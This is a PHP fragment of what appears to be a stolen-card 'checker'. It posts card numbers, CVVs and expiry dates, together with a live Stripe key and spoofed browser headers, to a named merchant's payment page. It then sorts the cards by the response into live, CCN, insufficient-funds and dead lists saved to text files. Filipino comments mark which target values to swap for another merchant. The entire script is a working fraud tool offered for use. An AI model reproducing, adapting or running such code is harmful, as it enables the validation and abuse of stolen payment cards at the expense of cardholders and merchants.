...
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://morpheus.network/payment/'); //ETO LANG PAPALITAN
...
$headers = array();
$headers[] ='Host: morpheus.network'; // ETO LANG PAPALITAN
...
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&owner[email]='.$name.'%40yahoo.com&owner[phone]=096635580401&owner[address][postal_code]=10010&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=2b876908-096c-4a9f-85e2-07c99ec3ed02be5808&muid=da7eac80-96b5-4b8f-aef2-6297fa8aa01d054531&sid=f36d08e5-d981-42d6-b613-efee005f231b41bb0a&pasted_fields=number&payment_user_agent=stripe.js%2F3d9d7c6b%3B+stripe-js-v3%2F3d9d7c6b&time_on_page=35376&referrer=https%3A%2F%2Fmorpheus.network%2F&key=pk_live_ny3nCgqYNfbisYu51mcqjpp6009Yyb9cXe'); //ETO LANG PAPALITAN
...
$headers[] ='accept: application/json';
$headers[] ='Content-Type: application/x-www-form-urlencoded';
$headers[] ='Origin: https://morpheus.network'; //ETO LANG PAPALITAN
$headers[] ='Referer: https://morpheus.network/payment/'; //ETO LANG PAPALITAN
$headers[] ='Sec-Fetch-Mode: cors';
$headers[] ='User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36';
...
if (strpos($result2, ',"cvc_check":"pass",')) {
  ...
  echo '<span class="badge badge-success">CVV</span> </span> <span class="badge badge-warning">'.$lista.'</span> <span class="badge badge-success"><b><i>2nd req: pass<b></i> [] <b><i>3rd req: '.$check2.''.$message.'</b></i> [] Luffy </span> </span> ';
}
elseif (strpos($result2, "Your card's security code is incorrect.")) {
  fwrite(fopen('CCN.txt', 'a'), $lista."\r\n");
  echo '<span class="badge badge-warning">CCN</span> <span class="badge badge-danger">'.$lista.'</span> <span class="badge badge-warning">sᴇᴄᴜʀɪᴛʏ ᴄᴏᴅᴇ ɪs ɪɴᴄᴏʀʀᴇᴄᴛ| luffy</span>';
}
...
elseif(strpos($result2, 'Your card has insufficient funds.')) {
  fwrite(fopen('insufficient.txt', 'a'), $lista."\r\n");
   echo '<span class="badge badge-success">CVV</span> </span> <span class="badge badge-danger">'.$lista.'</span> <span class="badge badge-success"> '.$mesg.' | ᴢʏɴᴄʙᴏɪ </span> </span> ';
}
elseif (strpos($result2, "Invalid source object: must be a dictionary or a non-empty string.")) {
  echo '<span class="badge badge-danger">DIE</span> <span class="badge badge-dark">' . $lista . '</span> <span class="badge badge-danger"></span> <span class="badge badge-danger"><b>GENERIC PHARMACY </b>| luffy </span> ';
}
elseif (strpos($result2, ',"cvc_check":"unavailable",')) {
  echo '<span class="badge badge-danger">DIE</span> <span class="badge badge-dark">' . $lista . '</span> <span class="badge badge-danger"></span> <span class="badge badge-danger"><b>unavailable </b>| luffy </span> ';
}
 else {
  fwrite(fopen('dead.txt', 'a'), $lista."\r\n");
  echo '<span class="badge badge-danger">DIE</span> <span class="badge badge-dark">' . $lista . '</span> <span class="badge badge-danger"></span> <span class="badge badge-danger"><b>'.$cvvcheck.''.$mesg.' </b> [] luffy </span> ';
}
  curl_close($curl);
  ob_flush();
